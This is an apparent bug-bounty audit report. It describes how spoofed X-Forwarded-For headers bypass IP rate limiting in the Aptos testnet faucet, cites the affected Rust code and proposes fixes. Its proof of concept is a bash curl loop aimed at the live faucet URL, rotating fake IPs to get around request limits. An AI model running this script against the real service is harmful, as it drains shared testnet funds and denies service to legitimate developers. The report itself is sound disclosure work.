# Audit Report

## Title
IP-Based Rate Limiting Bypass via X-Forwarded-For Header Spoofing in Aptos Faucet

## Summary
The Aptos Faucet service uses the `poem::web::RealIp` extractor to obtain client IP addresses from HTTP headers (X-Forwarded-For, X-Real-IP) for rate limiting purposes. Since the faucet is designed to run without a reverse proxy and performs no validation of trusted proxy sources, attackers can trivially spoof these headers to bypass IP-based rate limiting and drain faucet funds or cause denial of service. [1](#0-0) 

## Finding Description

The `FundApi::fund()` and `FundApi::is_eligible()` endpoints extract the source IP using `RealIp`, which automatically reads from client-controlled headers: [2](#0-1) 

This extracted IP is passed to the rate limiting checkers without any validation: [3](#0-2) 

The rate limiting checkers (both memory-based and Redis-based) directly use this unvalidated IP as the rate limiting key: [4](#0-3) [5](#0-4) 

**Critical Design Flaw**: The faucet documentation explicitly states it is designed to run without a reverse proxy: [6](#0-5) 

When the faucet is exposed directly to clients (as intended by design), attackers can set arbitrary X-Forwarded-For or X-Real-IP headers in their HTTP requests. The poem framework's `RealIp` extractor will trust these headers and return the attacker-specified IP address.

**Attack Scenario**:
1. Attacker sends funding request with header: `X-Forwarded-For: 1.2.3.4`
2. Rate limiter records request from IP `1.2.3.4`
3. Attacker sends another request with header: `X-Forwarded-For: 5.6.7.8`
4. Rate limiter sees this as a different client and allows the request
5. Attacker repeats with rotating IPs until faucet funds are exhausted

## Impact Explanation

**Severity: HIGH** (per Aptos Bug Bounty criteria)

This vulnerability enables:

1. **Faucet Fund Drainage**: Attackers can bypass daily request limits and drain all available testnet tokens, affecting legitimate developers and testers
2. **Denial of Service**: Rate limiting is the primary defense against abuse; bypassing it allows resource exhaustion attacks
3. **Operational Impact**: Testnet infrastructure becomes unreliable, harming developer experience and testing capabilities

While this affects testnet infrastructure rather than mainnet consensus, it meets HIGH severity criteria as it:
- Represents a significant protocol/security control violation
- Can cause service unavailability for legitimate users
- Bypasses the faucet's core security mechanism

## Likelihood Explanation

**Likelihood: VERY HIGH**

- **Attack Complexity**: Trivial - requires only setting HTTP headers
- **Attacker Requirements**: None - any HTTP client can exploit this
- **Detection Difficulty**: Low - spoofed IPs appear legitimate in logs
- **Exploitation**: Can be automated with simple scripts

The attack requires no special privileges, insider knowledge, or sophisticated techniques. Any user who understands HTTP can execute this attack within minutes.

## Recommendation

Implement trusted proxy validation before accepting forwarded IP headers. The faucet should either:

**Option 1 - Remove RealIp Reliance** (Recommended for direct exposure):
Use the actual TCP connection source IP instead of trusting headers when not behind a configured reverse proxy:

```rust
// In fund.rs, modify the preprocess_request function
async fn preprocess_request(
    &self,
    fund_request: &FundRequest,
    source_ip: RealIp,
    header_map: &HeaderMap,
    dry_run: bool,
    peer_addr: Option<std::net::SocketAddr>, // Add peer address from TCP layer
) -> poem::Result<(CheckerData, bool, Option<SemaphorePermit<'_>>), AptosTapError> {
    // Use actual peer address, ignore forwarded headers when directly exposed
    let source_ip = peer_addr.map(|addr| addr.ip()).or(source_ip.0);
    
    let source_ip = match source_ip {
        Some(ip) => ip,
        None => {
            return Err(AptosTapError::new(
                "No source IP found in the request".to_string(),
                AptosTapErrorCode::SourceIpMissing,
            ))
        },
    };
    // ... rest of function
}
```

**Option 2 - Add Trusted Proxy Configuration**:
If the faucet will be deployed behind reverse proxies, add configuration to specify trusted proxy IPs and only accept forwarded headers from those sources.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass rate limiting by rotating X-Forwarded-For headers

FAUCET_URL="http://faucet.testnet.aptoslabs.com/fund"
RECIPIENT="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

# Attempt 10 requests with spoofed IPs (should normally be rate limited after 3)
for i in {1..10}; do
    FAKE_IP="192.168.${i}.${i}"
    echo "Request $i with spoofed IP: $FAKE_IP"
    
    curl -X POST "$FAUCET_URL" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $FAKE_IP" \
        -d "{\"address\": \"$RECIPIENT\", \"amount\": 100000000}" \
        -w "\nHTTP Status: %{http_code}\n\n"
    
    sleep 1
done

# Expected: All 10 requests succeed (VULNERABLE)
# Expected (Fixed): Only first 3 requests succeed, rest return 429 Too Many Requests
```

**Verification Steps**:
1. Deploy faucet with Redis rate limiter configured for 3 requests/day per IP
2. Run the above script against the faucet endpoint
3. Observe that all 10 requests succeed despite rate limiting
4. Check Redis keys - each spoofed IP appears as a separate entry
5. Legitimate rate limiting is completely bypassed

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L102-111)
```rust
    async fn fund(
        &self,
        fund_request: Json<FundRequest>,
        asset: poem_openapi::param::Query<Option<String>>,
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
        // Same thing, this uses FromRequest.
        header_map: &HeaderMap,
    ) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L77-88)
```rust
        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-51)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
    }
```

**File:** crates/aptos-faucet/README.md (L23-23)
```markdown
- Built in rate limiting, e.g. with a [Redis](https://redis.io/) backend, eliminating the need for something like haproxy in front of the faucet. These are also just checkers.
```
